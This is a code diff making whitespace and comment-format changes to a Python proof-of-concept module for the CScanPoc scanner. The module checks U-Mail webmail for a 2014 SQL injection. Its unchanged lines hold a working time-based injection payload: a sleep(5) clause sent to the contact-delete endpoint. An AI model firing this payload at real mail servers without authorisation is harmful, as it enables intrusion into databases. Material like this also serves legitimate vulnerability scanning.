@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'U-Mail_0005_p' # 平台漏洞编号，留空
+    vuln_id = 'U-Mail_0005_p'  # 平台漏洞编号，留空
     name = 'U-Mail邮件系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-09-28'  # 漏洞公布时间
     desc = '''
         u-mail client\pab\module\o_contact.php中
@@ -33,8 +34,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #payload根据实际情况确定
+
+            # payload根据实际情况确定
             payload = '/webmail/client/pab/index.php?module=operate&action=contact-del'
             data_sleep = "contact_ids=-1) or sleep(5)%23"
             data_normal = "contact_ids=-1) or 1%23"
@@ -54,6 +55,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
